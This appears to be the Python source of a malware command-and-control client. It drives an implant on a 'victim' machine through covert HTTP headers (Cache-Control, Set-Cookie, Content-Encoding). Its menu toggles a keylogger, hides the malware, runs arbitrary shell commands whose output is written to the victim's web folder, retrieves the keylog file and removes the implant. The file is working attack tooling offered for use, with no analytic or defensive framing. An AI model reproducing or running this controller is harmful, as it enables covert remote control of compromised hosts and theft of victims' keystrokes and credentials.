import requests
import sys
import time

MALWARE_STATUS_CODE = 200  # Change this to 666
MALWARE_HEADER_RESPONSE = 'Content-Encoding'  # Change this to malware-response
WEB_FOLDER = "/var/web"
OUTPUT_SHELL_FILENAME = "output"
OUTPUT_KL_FILENAME = "klog.log"

class Victim:

    def __init__(self, victim_ip):
        self.victim_ip = victim_ip
        self.options = [
            ("Test connection", "test_connection", "0", ""),
            ("Toggle keylogger", "toggle_keylogger", "1", OUTPUT_KL_FILENAME),
            ("Trun on/off self hide", "set_self_hide", "2", ""),
            ("Run shell command", "run_shell_command", "3", OUTPUT_SHELL_FILENAME),
            ("Kill malware", "remove_malware", "4", ""),
            
        ]
        self.helpers = [
            ("View keylogger data", "view_keylogger"),
            ("Back to menu", "back")
        ]
        #self.commands = {"TEST":"0", "KEYLOGGER":"1", "GETDATA":"2", "KILL":"3", "CMD":"4"}
    def print_menu(self):
        """Print the menu options"""
        count = 1
        for option in self.options:
            print "[%d] - %s " % (count, option[0])
            count += 1
        for option in self.helpers:
            print "[%d] - %s " % (count, option[0])
            count += 1
        print

    def get_func_from_user(self, input_string):
        """Get input from user and translate it to a function"""
        input = raw_input(input_string)

        # Check that the input is a number
        try:
            choice = int(input)
        except ValueError:
            print "[!] Input is not a number!"
            return None

        # Check that there is such function
        if choice >= len(self.options) and choice < (len(self.helpers) + len(self.options) + 1):
            return getattr(self, self.helpers[choice - len(self.options) - 1][1])()

        elif len(self.options) < choice or choice <= 0:
            print "[!] Input is not in menu range"
            return None
        
        choice -= 1
        return getattr(self, self.options[choice][1])(self.options[choice][2], self.options[choice][3])

    def print_title(self, title):
        """Prints the menu's title"""
        print "[+] " + title + "\n"

    def communicate(self):
        """Start the menu for the victim's control"""

        while True:
            self.print_menu()
            try:
                user_chosen_func = self.get_func_from_user(">>> ")
                if user_chosen_func:
                    ret = user_chosen_func()
            except QuitVictim:
                print "[*] Quitting victim"
                return
            except VictimIsDead:
                print "[-] %s is dead" % self.victim_ip
                return
            

            # Add newline
            print

    def send_command(self, command, output_file, *args, **kwargs):
        """Send a command to the malware"""
        file_data = None
        output = kwargs.pop('output', sys.stdout)

        
        r = self.send_packet(command, *args)
        self.check_client(r)

        # Client is alive
        result = r.headers[MALWARE_HEADER_RESPONSE]
        
        if result.find(":file:") != -1 and output_file != "":
            time.sleep(1)
            result = result.replace(":file:", output_file)
            #print "http://{}/{}".format(self.victim_ip, file_path[1])
            file_data = requests.get("http://{}/{}".format(self.victim_ip, output_file))
            if file_data.status_code  != 404:
                file_data = file_data.text
            else:
                file_data = "File isnt exist"
                
        output.write("[+] %s response: %s\n" % (self.victim_ip, result))
        if (file_data):
            output.write(file_data)
        
    def test_connection(self, msg, output=""):
        """Test communication to the malware"""
        self.send_command(msg, output)

    def toggle_keylogger(self, msg, output=""):
        """Turn on the keylogger on the victim"""
        self.send_command(msg, output, WEB_FOLDER + "/" + output)
        
    def set_self_hide(self, msg, output=""):
        """Hide the malware"""
        self.send_command(msg, output)
         
    def remove_malware(self, msg, output=""):
        """Kill the malware"""
        self.send_command(msg, output)
        raise VictimIsDead

    def run_shell_command(self, msg, output=""):
        """Return the data sent by malware"""
        cmd = raw_input("Enter command to execute\n>>> ")
        self.send_command(msg, output, cmd + " > " + WEB_FOLDER + "/" + output)

    def check_client(self, r):
        """Check if response is from malware"""
        
        if not r or MALWARE_HEADER_RESPONSE not in r.headers:
            raise VictimIsDead

    def send_packet(self, function, *args):
        """Send an HTTP packet to be intercepted by the malware"""

        if len(args) != 0:
            headers = {"Cache-Control": function,
                       "Set-Cookie": ";".join(args)}
        else:
            headers = {"Cache-Control": function}

        try:
            return requests.get("http://%s/" % self.victim_ip,
                                headers=headers)
        except requests.exceptions.ConnectionError:
            print "ConnectionError"
            return None

    def view_keylogger(self):
        """View keylogger"""
        try:
            file_data = requests.get("http://{}/{}".format(self.victim_ip, OUTPUT_KL_FILENAME))
        except requests.exceptions.ConnectionError:
            print "ConnectionError"
            return None
        
        if file_data.status_code  != 404:
            file_data = file_data.text
        else:
            file_data = "File isnt exist"
        print (file_data)

    def back(self):
        """Quit the app"""
        raise QuitVictim

class QuitVictim(Exception):
    pass

class VictimIsDead(Exception):
    pass
